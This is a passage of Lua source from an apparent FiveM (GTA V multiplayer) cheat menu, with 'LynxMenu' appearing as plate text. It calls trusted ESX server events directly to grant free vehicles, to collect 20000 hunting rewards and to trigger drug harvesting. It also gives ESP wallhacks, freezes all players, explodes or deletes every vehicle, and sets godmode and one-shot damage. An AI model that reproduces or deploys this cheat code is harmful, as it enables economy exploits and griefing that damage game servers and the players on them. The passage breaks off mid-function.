            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        av('~g~~h~Success', false)
    else
        av('~b~~h~Model is not valid !', true)
    end
end

function daojosdinpatpemata()
    local ax = GetPlayerPed(-1)
    local ay = GetVehiclePedIsIn(ax, true)
    if
        IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
     then
        SetVehicleOnGroundProperly(ay)
        av('~g~Vehicle Flipped!', false)
    else
        av("~b~You Aren't In The Driverseat Of A Vehicle!", true)
    end
end

function stringsplit(cy, cz)
    if cz == nil then
        cz = '%s'
    end
    local cA = {}
    i = 1
    for cB in string.gmatch(cy, '([^' .. cz .. ']+)') do
        cA[i] = cB
        i = i + 1
    end
    return cA
end
local cC = false

function SpectatePlayer(cD)
    local ax = PlayerPedId(-1)
    cC = not cC
    local cE = GetPlayerPed(cD)
    if cC then
        local cF, cG, cH = table.unpack(GetEntityCoords(cE, false))
        RequestCollisionAtCoord(cF, cG, cH)
        NetworkSetInSpectatorMode(true, cE)
        av('Spectating ' .. GetPlayerName(cD), false)
    else
        local cF, cG, cH = table.unpack(GetEntityCoords(cE, false))
        RequestCollisionAtCoord(cF, cG, cH)
        NetworkSetInSpectatorMode(false, cE)
        av('Stopped Spectating ' .. GetPlayerName(cD), false)
    end
end

function ShootPlayer(cD)
    local head = GetPedBoneCoords(cD, GetEntityBoneIndexByName(cD, 'SKEL_HEAD'), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true)
end

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        0,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        1,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        2,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        3,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        4,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        5,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        6,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        7,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        8,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        9,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        10,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        11,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        12,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        13,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1,
        false
    )
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        15,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        16,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1,
        false
    )
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        25,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        27,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        28,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        30,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        33,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        34,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        35,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        38,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1,
        true
    )
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true)
    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true)
    SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
end

function DelVeh(veh)
    SetEntityAsMissionEntity(Object, 1, 1)
    DeleteEntity(Object)
    SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
    DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
    SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
    SetVehicleDirtLevel(veh, 1.0)
end

function RequestControl(entity)
    local cI = 0
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) do
        cI = cI + 100
        Citizen.Wait(100)
        if cI > 5000 then
            av('Hung for 5 seconds, killing to prevent issues...', true)
        end
    end
end

function getEntity(cD)
    local m, entity = GetEntityPlayerIsFreeAimingAt(cD, Citizen.ReturnResultAnyway())
    return entity
end

function GetInputMode()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and 'MouseAndKeyboard' or 'GamePad'
end

function DrawSpecialText(cJ, cK)
    SetTextEntry_2('STRING')
    AddTextComponentString(cJ)
    DrawSubtitleTimed(cK, 1)
end
local cL = true
local cM = false
local cN = true
local cO = true
Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            for f = 0, 128 do
                if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                    ped = GetPlayerPed(f)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(f), false, false, '', false)
                    wantedLvl = GetPlayerWantedLevel(f)
                    if cM then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if cL then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, f)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
                                            vehModel == GetHashKey('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, f)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
                                        vehModel == GetHashKey('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehModel == GetHashKey('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, f)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)
local cP = {
    __gc = function(cQ)
        if cQ.destructor and cQ.handle then
            cQ.destructor(cQ.handle)
        end
        cQ.destructor = nil
        cQ.handle = nil
    end
}

function EnumerateEntities(cR, cS, cT)
    return coroutine.wrap(
        function()
            local cU, f = cR()
            if not f or f == 0 then
                cT(cU)
                return
            end
            local cQ = {
                handle = cU,
                destructor = cT
            }
            setmetatable(cQ, cP)
            local cV = true
            repeat
                coroutine.yield(f)
                cV, f = cS(cU)
            until not cV
            cQ.destructor, cQ.handle = nil, nil
            cT(cU)
        end
    )
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function RotationToDirection(cW)
    local cX = cW.z * 0.0174532924
    local cY = cW.x * 0.0174532924
    local cZ = math.abs(math.cos(cY))
    return vector3(-math.sin(cX) * cZ, math.cos(cX) * cZ, math.sin(cY))
end

function OscillateEntity(entity, c_, d0, d1, d2)
    if entity ~= 0 and entity ~= nil then
        local d3 = (d0 - c_) * d1 * d1 - 2.0 * d1 * d2 * GetEntityVelocity(entity)
        ApplyForceToEntity(entity, 3, d3.x, d3.y, d3.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true)
    end
end
local d4 = true
Citizen.CreateThread(
    function()
        while bw do
            Citizen.Wait(0)
            SetPlayerInvincible(PlayerId(), Godmode)
            SetEntityInvincible(PlayerPedId(-1), Godmode)
            SetEntityVisible(GetPlayerPed(-1), d4, 0)
            if SuperJump then
                SetSuperJumpThisFrame(PlayerId(-1))
            end
            if InfStamina then
                RestorePlayerStamina(PlayerId(-1), 1.0)
            end
            if fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end
            if VehicleGun then
                local d5 = 'Freight'
                local c0 = GetEntityCoords(GetPlayerPed(-1), true)
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
                    av('~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!', false)
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999)
                    if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_APPISTOL') then
                        if IsPedShooting(GetPlayerPed(-1)) then
                            while not HasModelLoaded(GetHashKey(d5)) do
                                Citizen.Wait(0)
                                RequestModel(GetHashKey(d5))
                            end
                            local veh =
                                CreateVehicle(
                                GetHashKey(d5),
                                c0.x + 5 * GetEntityForwardX(GetPlayerPed(-1)),
                                c0.y + 5 * GetEntityForwardY(GetPlayerPed(-1)),
                                c0.z + 2.0,
                                GetEntityHeading(GetPlayerPed(-1)),
                                true,
                                true
                            )
                            SetEntityAsNoLongerNeeded(veh)
                            SetVehicleForwardSpeed(veh, 150.0)
                        end
                    end
                end
            end
            if DeleteGun then
                local d6 = getEntity(PlayerId(-1))
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
                    av('~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!')
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
                    if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
                        if IsPlayerFreeAiming(PlayerId(-1)) then
                            if IsEntityAPed(d6) then
                                if IsPedInAnyVehicle(d6, true) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(d6, true), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(d6, true))
                                        SetEntityAsMissionEntity(d6, 1, 1)
                                        DeleteEntity(d6)
                                        av('~g~Deleted!')
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(d6, 1, 1)
                                        DeleteEntity(d6)
                                        av('~g~Deleted!')
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(d6, 1, 1)
                                    DeleteEntity(d6)
                                    av('~g~Deleted!')
                                end
                            end
                        end
                    end
                end
            end
            if fuckallcars then
                for ay in EnumerateVehicles() do
                    if not IsPedAPlayer(GetPedInVehicleSeat(ay, -1)) then
                        SetVehicleHasBeenOwnedByPlayer(ay, false)
                        SetEntityAsMissionEntity(ay, false, false)
                        StartVehicleAlarm(ay)
                        DetachVehicleWindscreen(ay)
                        SmashVehicleWindow(ay, 0)
                        SmashVehicleWindow(ay, 1)
                        SmashVehicleWindow(ay, 2)
                        SmashVehicleWindow(ay, 3)
                        SetVehicleTyreBurst(ay, 0, true, 1000.0)
                        SetVehicleTyreBurst(ay, 1, true, 1000.0)
                        SetVehicleTyreBurst(ay, 2, true, 1000.0)
                        SetVehicleTyreBurst(ay, 3, true, 1000.0)
                        SetVehicleTyreBurst(ay, 4, true, 1000.0)
                        SetVehicleTyreBurst(ay, 5, true, 1000.0)
                        SetVehicleTyreBurst(ay, 4, true, 1000.0)
                        SetVehicleTyreBurst(ay, 7, true, 1000.0)
                        SetVehicleDoorBroken(ay, 0, true)
                        SetVehicleDoorBroken(ay, 1, true)
                        SetVehicleDoorBroken(ay, 2, true)
                        SetVehicleDoorBroken(ay, 3, true)
                        SetVehicleDoorBroken(ay, 4, true)
                        SetVehicleDoorBroken(ay, 5, true)
                        SetVehicleDoorBroken(ay, 6, true)
                        SetVehicleDoorBroken(ay, 7, true)
                        SetVehicleLights(ay, 1)
                        Citizen.InvokeNative(0x1FD09E7390A74D54, ay, 1)
                        SetVehicleNumberPlateTextIndex(ay, 5)
                        SetVehicleNumberPlateText(ay, 'LynxMenu')
                        SetVehicleDirtLevel(ay, 10.0)
                        SetVehicleModColor_1(ay, 1)
                        SetVehicleModColor_2(ay, 1)
                        SetVehicleCustomPrimaryColour(ay, 255, 51, 255)
                        SetVehicleCustomSecondaryColour(ay, 255, 51, 255)
                        SetVehicleBurnout(ay, true)
                    end
                end
            end
            if destroyvehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleUndriveable(vehicle, true)
                        SetVehicleEngineHealth(vehicle, 0)
                    end
                end
            end
            if explodevehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        NetworkRequestControlOfEntity(vehicle)
                        NetworkExplodeVehicle(vehicle, true, true, false)
                    end
                end
            end
            if huntspam then
                Citizen.Wait(1)
                TriggerServerEvent('esx-qalle-hunting:reward', 20000)
                TriggerServerEvent('esx-qalle-hunting:sell')
            end
            if deletenearestvehicle then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
                        DeleteEntity(GetVehiclePedIsIn(vehicle, true))
                        SetEntityAsMissionEntity(vehicle, 1, 1)
                        DeleteEntity(vehicle)
                    end
                end
            end
            if freezeplayer then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            end
            if freezeall then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end
            if esp then
                for i = 0, 128 do
                    if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
                        local a8 = k(1.0)
                        local d7 = GetPlayerPed(i)
                        local d8, d9, da = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                        local x, y, z = table.unpack(GetEntityCoords(d7))
                        local db =
                            '~h~Name: ' ..
                            GetPlayerName(i) ..
                                '\nServer ID: ' ..
                                    GetPlayerServerId(i) ..
                                        '\nPlayer ID: ' ..
                                            i ..
                                                '\nDist: ' ..
                                                    math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1)
                        if IsPedInAnyVehicle(d7, true) then
                            local dc =
                                GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7))))
                            db = db .. '\nVeh: ' .. dc
                        end
                        if espinfo and esp then
                            DrawText3D(x, y, z - 1.0, db, a8.r, a8.g, a8.b)
                        end
                        if espbox and esp then
                            LineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            LineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            LineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            DrawLine(
                                LineOneBegin.x,
                                LineOneBegin.y,
                                LineOneBegin.z,
                                LineOneEnd.x,
                                LineOneEnd.y,
                                LineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineTwoBegin.x,
                                LineTwoBegin.y,
                                LineTwoBegin.z,
                                LineTwoEnd.x,
                                LineTwoEnd.y,
                                LineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeBegin.x,
                                LineThreeBegin.y,
                                LineThreeBegin.z,
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                LineFourBegin.x,
                                LineFourBegin.y,
                                LineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineOneBegin.x,
                                TLineOneBegin.y,
                                TLineOneBegin.z,
                                TLineOneEnd.x,
                                TLineOneEnd.y,
                                TLineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineTwoBegin.x,
                                TLineTwoBegin.y,
                                TLineTwoBegin.z,
                                TLineTwoEnd.x,
                                TLineTwoEnd.y,
                                TLineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeBegin.x,
                                TLineThreeBegin.y,
                                TLineThreeBegin.z,
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                TLineFourBegin.x,
                                TLineFourBegin.y,
                                TLineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorOneBegin.x,
                                ConnectorOneBegin.y,
                                ConnectorOneBegin.z,
                                ConnectorOneEnd.x,
                                ConnectorOneEnd.y,
                                ConnectorOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorTwoBegin.x,
                                ConnectorTwoBegin.y,
                                ConnectorTwoBegin.z,
                                ConnectorTwoEnd.x,
                                ConnectorTwoEnd.y,
                                ConnectorTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorThreeBegin.x,
                                ConnectorThreeBegin.y,
                                ConnectorThreeBegin.z,
                                ConnectorThreeEnd.x,
                                ConnectorThreeEnd.y,
                                ConnectorThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorFourBegin.x,
                                ConnectorFourBegin.y,
                                ConnectorFourBegin.z,
                                ConnectorFourEnd.x,
                                ConnectorFourEnd.y,
                                ConnectorFourEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                        end
                        if esplines and esp then
                            DrawLine(d8, d9, da, x, y, z, a8.r, a8.g, a8.b, 255)
                        end
                    end
                end
            end
            if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
            end
            if oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
                local dd = getEntity(PlayerId(-1))
                if IsEntityAPed(dd) then
                    if IsPedInAnyVehicle(dd, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(dd, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(dd, true), true, true, 0)
                            end
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
            end
            if rainbowf then
                for i = 1, 7 do
                    Citizen.Wait(100)
                    SetPedWeaponTintIndex(GetPlayerPed(-1), 1198879012, i)
                    i = i + 1
                    if i == 7 then
                        i = 1
                    end
                end
            end
            if BlowDrugsUp then
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_drugs:startHarvestWeed')
                        TriggerServerEvent('esx_drugs:startHarvestCoke')
                        TriggerServerEvent('esx_drugs:startHarvestMeth')
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                        TriggerServerEvent('esx_drugs:startTransformWeed')
                        TriggerServerEvent('esx_drugs:startTransformCoke')
